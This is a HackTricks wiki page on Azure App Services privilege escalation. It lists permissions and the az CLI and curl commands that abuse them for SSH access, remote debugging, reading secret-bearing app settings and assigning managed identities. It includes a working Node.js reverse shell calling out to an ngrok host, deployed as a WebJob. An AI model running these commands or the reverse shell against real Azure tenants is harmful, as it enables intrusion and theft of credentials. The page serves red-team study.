# Az - App Services Privesc

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1) (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2) (1).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2) (1).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## App Services

For more information about Azure App services check:

{% content-ref url="../az-services/az-app-services.md" %}
[az-app-services.md](../az-services/az-app-services.md)
{% endcontent-ref %}

### Microsoft.Web/sites/publish/Action, Microsoft.Web/sites/basicPublishingCredentialsPolicies/read, Microsoft.Web/sites/config/read, Microsoft.Web/sites/read,&#x20;

These permissions allows to call the following commands to get a **SSH shell** inside a web app or **start a debugging session** within the app.

* SSH Direct:

```bash
# Direct option
az webapp ssh --name <name> --resource-group <res-group>
```

* Create tunnel and then connect to SSH:

{% code overflow="wrap" %}
```bash
az webapp create-remote-connection --name <name> --resource-group <res-group>

## If successfull you will get a message such as:
#Verifying if app is running....
#App is running. Trying to establish tunnel connection...
#Opening tunnel on port: 39895
#SSH is available { username: root, password: Docker! }

## So from that machine ssh into that port (you might need generate a new ssh session to the jump host)
ssh root@127.0.0.1 -p 39895
```

* Start Debugging Session:
    1. Open the Azure extension from Visual Studio Code and login with a user with enough permissions.
    2. Access the Subscription and inside of it list the App Services.
    3. Right click on the App Service and select **Start Remote Debugging**.
    4. You might need the permission `Microsoft.Web/sites/config/write` to **enable debugging** in the App service. Note that an app debuggin option is set to off automatically every 48h.


### Microsoft.Web/sites/publish/Action

This permission, among other things, allows to:

* Create a new Webjosb (this could also be done using the SCM creds):

```bash
# Example Windows + NodeJS rev shell code (rev.js):
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("powershell.exe", ["-ep", "bypass"]);
    var client = new net.Socket();
    client.connect(12557, "4.tcp.eu.ngrok.io", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/;
})();


# Using Azure permissions
az rest \
	 --method put \ 
	--uri "https://<APP_SERVICE_NAME>.scm.azurewebsites.net/api/continuouswebjobs/<WEBJOB_NAME>" \
	 --headers "Content-Type=application/zip" \
	 --body "@/path/to/MyWebJob.zip" \
	 --auth basic --username <USERNAME> --password <PUBLISHING_PASSWORD>

## Full example
az rest \
  --method put \
  --uri "https://windowsapptesting-ckbrg3f0hyc8fkgp.scm.canadacentral-01.azurewebsites.net/api/Continuouswebjobs/reverse_shell" \
  --headers '{"Content-Disposition": "attachment; filename=\"rev.js\""}' \
  --body "@/Users/carlospolop/Downloads/rev.js" \
  --resource "https://management.azure.com/"

#¬†Using username and password:
curl -X PUT \
  "<SCM-URL>/api/Continuouswebjobs/<webjob-name>" \
  -H 'Content-Disposition: attachment; filename=rev.js' \
  --data-binary "@/Users/carlospolop/Downloads/rev.js" \
  --user '<username>:<password>'
```

* Read the logs of the Webjobs which could contain **sensitive info**. Moreover, it's also possible to use the SCM credentials to access the logs:
{% code overflow="wrap" %}
```bash
# Using Azure permissions
az rest --method GET --url ‚Äú<app-url>/vfs/data/jobs/<continuous | triggered>/rev5/job_log.txt"  --resource "https://management.azure.com/"
az rest --method GET --url "https://lol-b5fyaeceh4e9dce0.scm.canadacentral-01.azurewebsites.net/vfs/data/jobs/continuous/rev5/job_log.txt" \
    --resource "https://management.azure.com/"

# Using SCM credentials
curl "<SCM URL>/vfs/data/jobs/<triggered | continuos>/<webjob-name>/job_log.txt" \
  --user '<username>:<password>' -v
```

### Microsoft.Web/sites/config/list/action

This permission allows to list the app settings of the web app. This could contain sensitive information such as **connection strings** or **API keys**.

```bash
az webapp config appsettings list --name <name> --resource-group <res-group>
```

### Microsoft.ManagedIdentity/userAssignedIdentities/assign/action, Microsoft.Web/sites/write, Microsoft.Web/sites/read

These permissions allow to **assign a managed identity** to the web app. If the attacker has already compromised an App this could be useful to **escalate privileges** to other managed identities.

```bash
az webapp identity assign --name <app-name> --resource-group <res-group> --identities /subscriptions/<subcripttion-id>/resourceGroups/<res_group>/providers/Microsoft.ManagedIdentity/userAssignedIdentities/<managed-identity-name>
```

{% endcode %}

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1) (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2) (1).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2) (1).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
